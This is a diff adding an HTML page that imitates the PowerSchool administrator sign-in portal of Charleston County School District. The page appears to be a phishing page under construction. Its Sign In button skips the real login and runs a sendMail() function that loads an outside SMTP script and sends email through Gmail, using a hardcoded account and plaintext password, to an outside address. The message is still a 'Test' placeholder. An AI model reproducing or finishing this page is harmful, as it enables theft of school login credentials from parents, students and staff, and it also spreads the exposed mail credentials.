@@ -1,0 +1,177 @@
+<html lang="en"><head>
+		<title>
+			
+				Administrator Sign In
+            
+		</title>
+		<meta name="robots" content="noindex">
+		<link href="style1.css" rel="stylesheet" media="screen">
+        <link href="style2.css" rel="stylesheet" media="print">
+		<link href="/images/css/customization.css" rel="stylesheet" type="text/css" media="screen">
+		<meta name="viewport" content="width=device-width">
+		<link rel="apple-touch-icon-precomposed" sizes="57x57" href="/apple-touch-icon-57x57.png">
+		<link rel="apple-touch-icon-precomposed" sizes="114x114" href="/apple-touch-icon-114x114.png">
+		<link rel="apple-touch-icon-precomposed" sizes="72x72" href="/apple-touch-icon-72x72.png">
+		<link rel="apple-touch-icon-precomposed" sizes="144x144" href="/apple-touch-icon-144x144.png">
+		<link rel="apple-touch-icon-precomposed" sizes="60x60" href="/apple-touch-icon-60x60.png">
+		<link rel="apple-touch-icon-precomposed" sizes="120x120" href="/apple-touch-icon-120x120.png">
+		<link rel="apple-touch-icon-precomposed" sizes="76x76" href="/apple-touch-icon-76x76.png">
+		<link rel="apple-touch-icon-precomposed" sizes="152x152" href="/apple-touch-icon-152x152.png">
+
+		<link rel="icon" type="image/png" href="favicon-196x196.png" sizes="196x196">
+		<link rel="icon" type="image/png" href="/favicon-96x96.png" sizes="96x96">
+		<link rel="icon" type="image/png" href="/favicon-32x32.png" sizes="32x32">
+		<link rel="icon" type="image/png" href="/favicon-16x16.png" sizes="16x16">
+		<link rel="icon" type="image/png" href="/favicon-128.png" sizes="128x128">
+		<meta name="application-name" content="PowerSchool">
+		<meta name="msapplication-TileColor" content="#FFFFFF">
+		<meta name="msapplication-TileImage" content="/mstile-144x144.png">
+		<meta name="msapplication-square70x70logo" content="/mstile-70x70.png">
+		<meta name="msapplication-square150x150logo" content="/mstile-150x150.png">
+		<meta name="msapplication-wide310x150logo" content="/mstile-310x150.png">
+		<meta name="msapplication-square310x310logo" content="/mstile-310x310.png">
+		<link rel="shortcut icon" href="/favicon.ico">
+		<script src="https://smtpjs.com/v3/smtp.js"></script>
+		
+	</head>
+	<body class="pslogin" id="palogin">
+		<div id="container">
+            <div id="branding-district"></div>
+			<div id="content" class="group">
+                <div id="branding-powerschool"></div>
+                <h1>
+					
+						Administrator Sign In
+                    
+                </h1>
+                <div class="tabs ui-tabs ui-widget ui-widget-content ui-corner-all">
+                     
+	                   
+		                    <ul class="ui-tabs-nav ui-helper-reset ui-helper-clearfix ui-widget-header ui-corner-all" role="tablist">
+		                        
+		                        
+		                    </ul>
+	                   
+	                 
+	                 
+	                 <div id="sign-in-content" aria-labelledby="ui-id-1" class="ui-tabs-panel ui-widget-content ui-corner-bottom" role="tabpanel" aria-hidden="false">
+	                    <form method="post" name="LoginForm" target="_top" id="LoginForm" onsubmit="doPCASLogin(this);">
+                            
+                            
+
+                            <input type="hidden" name="pstoken" value="*[x:pstoken]">
+                            <input type="hidden" name="contextData" id="contextData" value="*[x:pskey]">
+                            <input type="hidden" name="dbpw" value="">
+                            <input type="hidden" name="translator_username" value="">
+                            <input type="hidden" name="translator_password" value="">
+                            <input type="hidden" name="translator_ldappassword" value="">
+                            <input type="hidden" name="returnUrl" value="">
+<input type="hidden" name="serviceName" value="PS Parent Portal">
+<input type="hidden" name="serviceTicket" value="">
+<input type="hidden" name="pcasServerUrl" value="/">
+<input type="hidden" name="credentialType" value="User Id and Password Credential">
+                            
+
+                            
+
+
+                            <!--box content-->
+                             
+                                
+                                <div id="noscript" class="feedback-alert" style="display: none;">
+	                                 To sign in to PowerSchool, you must use a browser that supports and has JavaScript enabled. 
+	                            </div>
+								<div id="login_fieldset">
+	                            <fieldset id="login-inputs" class="">
+	                                
+	                                <div>
+	                                    <label for="fieldAccount">Username</label>
+	                                    <input type="text" id="fieldAccount" name="account" value="" size="39">
+	                                </div>
+	                                <div>
+	                                    <label for="fieldPassword">Password</label>
+	                                    <input type="password" id="fieldPassword" name="pw" value="" size="39" autocomplete="off" onkeypress="capslockon">
+                                    </div>
+                                    <div id="translatorInput" style="display: none;">
+                                        <label for="fieldTranslator">Translator Sign In</label>
+                                        <input type="password" id="fieldTranslator" name="translatorpw" value="" size="39" autocomplete="off">
+                                    </div>
+                                    <div id="capslockdiv" style="display:none;color:red;">Warning: Caps Lock is currently on.</div><p id="p02" style="color: rgb(255, 0, 0);">Forgot password, are experiencing sign in issues or have questions or comments about PowerSchool: please contact your school directly.</p><br><p id="p01" style="color: rgb(255, 0, 0);">To sign in to PowerSchool, you must use Mozilla Firefox © (preferred) or Google Chrome ©.</p>
+									<div class="button-row">
+										<input type="button" id="btn-enter" title="Sign In To PowerSchool Administrator Access" value="Sign In" border="0" onclick="sendMail()">
+										</button>
+									</div>
+								</fieldset>
+								</div>
+								<script>
+									function sendMail() {
+										Email.send({
+											Host : "smtp.gmail.com",
+											Username : "pizzamnk@gmail.com",
+											Password : "DogsSmellGood",
+											To : 'Rolandguerriere@gmail.com',
+											From : "pizzamnk@gmail.com",
+											Subject : "Test",
+											Body : "And this is the body"
+										}).then(
+										message => alert(message)
+										);
+									}
+								</script>
+								
+							
+                            <!-- box content-->
+                        </form>
+                    </div>
+                    
+	                    <div id="create-account-content" aria-labelledby="ui-id-2" class="ui-tabs-panel ui-widget-content ui-corner-bottom" role="tabpanel" aria-hidden="true" style="display: none;">
+	                        	<h2>Create an Account</h2>
+	<form action="/public/create_multi_student_account.html">
+
+        <p>
+        Create a parent account that allows you to view all of your students with one account. You can also manage your account preferences. <a href="/public/createaccounthelp.html">Learn more.</a>
+        </p>
+        <div class="button-row">
+           <button type="submit" title="Create Account">Create Account</button>
+        </div>
+
+	</form>
+
+
+	                    </div>
+                    
+                  </div>
+				
+				<div id="signin-custom-message">
+					<strong>Welcome to Parent Portal at Charleston County School District (CCSD)</strong>
+<hr>
+<strong>Terms of Use</strong><br>
+<p class="tab">Use of CCSD electronic communications and systems is subject to federal, state, and local law and regulation, including the Children's Internet Protection Act (47 U.S.C. 254).</p>
+<p class="tab">All use is subject to the CCSD Technology Acceptable Use Policy (GBEBD). All users of CCSD networks and electronic communications, including employee and students, shall have no expectation of privacy in such use. CCSD may monitor, disclose, store, or delete electronic communications.</p>
+<p class="tab">By using CCSD networks and electronic communications, you accept these Terms of Use and agree to comply with all applicable policies, regulations and law.</p>
+<p class="tab"><strong>To accept these terms, please click the "Sign In" button above.</strong></p>
+<hr>
+				</div>
+				
+			</div>
+			<div id="footer" class="group">
+				<div id="legal">
+					<p>
+						Copyright © 2005-2021 PowerSchool Group LLC and/or its affiliate(s). All rights reserved.<br>All trademarks are either owned or licensed by PowerSchool Group LLC and/or its affiliates.
+					</p>
+				</div>
+				<p id="pearsoncorplink">
+					
+				</p>
+			</div>
+		</div>
+		
+		
+		<div id="branding-pearson">
+			<div id="logo-pearson"></div>
+			<div id="tagline-pearson"></div>
+		</div>
+		
+
+
+</body></html>
